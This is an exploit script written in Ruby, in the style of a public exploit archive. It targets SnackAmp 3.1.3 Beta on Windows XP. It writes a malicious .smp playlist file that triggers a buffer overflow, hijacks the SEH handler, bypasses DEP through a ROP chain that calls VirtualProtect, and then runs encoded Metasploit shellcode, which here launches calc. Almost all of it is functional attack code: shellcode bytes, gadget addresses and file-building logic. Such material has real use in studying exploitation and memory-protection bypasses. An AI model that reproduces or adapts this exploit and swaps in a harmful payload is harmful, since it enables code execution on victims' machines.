# Exploit Title: SnackAmp 3.1.3B Malicious SMP Buffer Overflow Vulnerability (SEH - DEP BYPASS)
# Date: 09/24/10  
# Author: Muhamad Fadzil Ramli - mind1355 [AT] gmail [DOT] com  
# Credit/Bug Found By: james [AT] learnsecurityonline [DOT] com 
# Software Link: http://sourceforge.net/projects/snackamp/  
# Version: 3.1.3 Beta
# Tested on: Windows XP SP3 EN  (Virtualbox 3.2.8 R64453)
# CVE: N/A
# GREETZ: Intranium Sdn Bhd (Security Team)
#		: corelanc0d3r - Great Tutorial
#
#! /usr/bin/env ruby

# windows/exec - 144 bytes  
# http://www.metasploit.com  
# Encoder: x86/shikata_ga_nai  
# EXITFUNC=seh, CMD=calc  
payload =  "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc" 
payload << "\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78" 
payload << "\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85" 
payload << "\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5" 
payload << "\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c" 
payload << "\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21" 
payload << "\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5" 
payload << "\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27" 
payload << "\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3" 
payload << "\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53" 
payload << "\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f" 
payload << "\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6" 
payload << "\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8" 
payload << "\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" 
payload << "\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f" 
payload << "\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca"

junk1	= "A" * 13864
seh		= [0x004659C1].pack('V')			# ADD     ESP, 428 # RETN 	[Module : snackAmp.exe]
ret		= [0x014E101F].pack('V') * 50		# RETN 	[Module : pngtcl10.dll]

# ROP 1
rop1	= ''
rop1	<< [0x71ABDAC3].pack('V')			# PUSH    ESP # POP     ESI # RETN 	[Module : WS2_32.dll]
#rop1	<< [0x014E1265].pack('V')			# MOV     EAX, ESI # POP     ESI # RETN 	[Module : pngtcl10.dll]
#rop1	<< "DEAD"							# PADDING
rop1	<< [0x014F08B1].pack('V')			# ADD     ESP, 20 # RETN 	[Module : pngtcl10.dll]
# END

# VIRTUALPROTECT PARAMETERS
params	= ''
params << [0x7C801AD4].pack('V') 			# VirtualProtect
params << 'WWWW'   							# return address (param1)
params << 'XXXX'   							# lpAddress      (param2)
params << 'YYYY'   							# Size           (param3)
params << 'ZZZZ'   							# flNewProtect   (param4)
params << [0x014F5005].pack('V');  			# writeable address
params << 'DEAD' * 2						# PADDING
# END

# ROP 2
# PARAM 1
rop2	= ''
rop2	<< [0x014E1265].pack('V')			# MOV     EAX, ESI # POP     ESI # RETN 	[Module : pngtcl10.dll]
rop2	<< "DEAD"
rop2	<< [0x77037BFA].pack('V')			# PUSH    EAX # POP     ESI # POP     EBX # RETN 	[Module : CLBCATQ.DLL]
rop2	<< "DEAD"
rop2	<< [0x014F2860].pack('V') * 10		# ADD     EAX, 20 # RETN 	[Module : pngtcl10.dll]
rop2	<< [0x71ABC7E8].pack('V')			# MOV     DWORD PTR DS:[ESI+8], EAX # MOV     EAX, ESI # POP     ESI # POP     EBP # RETN    4 	[Module : WS2_32.dll]
rop2	<< "DEAD" * 2
# END

# PARAM 2
rop2	<< [0x77037BFA].pack('V')			# PUSH    EAX # POP     ESI # POP     EBX # RETN 	[Module : CLBCATQ.DLL]
rop2	<< "DEAD" * 2
rop2	<< [0x014F2860].pack('V') * 10		# ADD     EAX, 20 # RETN 	[Module : pngtcl10.dll]
rop2	<< [0x75F991D3].pack('V') * 4		# INC     ESI # RETN 	[Module : browseui.dll]
rop2	<< [0x71ABC7E8].pack('V')			# MOV     DWORD PTR DS:[ESI+8], EAX # MOV     EAX, ESI # POP     ESI # POP     EBP # RETN    4 	[Module : WS2_32.dll]
rop2	<< "DEAD" * 2
# END

# PARAM 3
rop2	<< [0x77037BFA].pack('V')			# PUSH    EAX # POP     ESI # POP     EBX # RETN 	[Module : CLBCATQ.DLL]
rop2	<< "DEAD" * 2
rop2	<< [0x014E1248].pack('V')			# XOR     EAX, EAX # RETN 	[Module : pngtcl10.dll]
rop2	<< [0x77C4EC2B].pack('V')			# ADD     EAX, 100 # POP     EBP # RETN 	[Module : MSVCRT.dll]
rop2	<< "DEAD"
rop2	<< [0x77C4EC2B].pack('V')			# ADD     EAX, 100 # POP     EBP # RETN 	[Module : MSVCRT.dll]
rop2	<< "DEAD"
rop2	<< [0x77C4EC2B].pack('V')			# ADD     EAX, 100 # POP     EBP # RETN 	[Module : MSVCRT.dll]
rop2	<< "DEAD"
rop2	<< [0x75F991D3].pack('V') * 4		# INC     ESI # RETN 	[Module : browseui.dll]
rop2	<< [0x71ABC7E8].pack('V')			# MOV     DWORD PTR DS:[ESI+8], EAX # MOV     EAX, ESI # POP     ESI # POP     EBP # RETN    4 	[Module : WS2_32.dll]
rop2	<< "DEAD" * 2
# END

# PARAM 4
rop2	<< [0x77037BFA].pack('V')			# PUSH    EAX # POP     ESI # POP     EBX # RETN 	[Module : CLBCATQ.DLL]
rop2	<< "PPPP" * 2
rop2	<< [0x014E1248].pack('V')			# XOR     EAX, EAX # RETN 	[Module : pngtcl10.dll]
rop2	<< [0x76CA8BBF].pack('V')			# ADD     EAX, 40 # RETN 	[Module : IMAGEHLP.dll]
rop2	<< [0x75F991D3].pack('V') * 4		# INC     ESI # RETN 	[Module : browseui.dll]
rop2	<< [0x71ABC7E8].pack('V')			# MOV     DWORD PTR DS:[ESI+8], EAX # MOV     EAX, ESI # POP     ESI # POP     EBP # RETN    4 	[Module : WS2_32.dll]
rop2	<< "DEAD" * 2
# END

# POINT ESP TO VIRTUALPROCTECT
rop2	<< [0x775D1381].pack('V')			# SUB     EAX, 4 # RETN 	[Module : ole32.dll]
rop2	<< "DEAD"
rop2	<< [0x775D1381].pack('V')			# SUB     EAX, 4 # RETN 	[Module : ole32.dll]
rop2	<< [0x5B886978].pack('V')			# XCHG    EAX, ESP # RETN 	[Module : NETAPI32.dll]
# END

nops	= "\x90" * 150
junk2	= "C" * (20000 - (junk1 + seh + ret + rop1 + params + rop2 + nops + payload).length)
xploit	= junk1 + seh + ret + rop1 + params + rop2 + nops + payload + junk2


File.open("crash.smp", 'w') do |fd|  
	fd.write xploit
	puts "file size: " + xploit.length.to_s
end 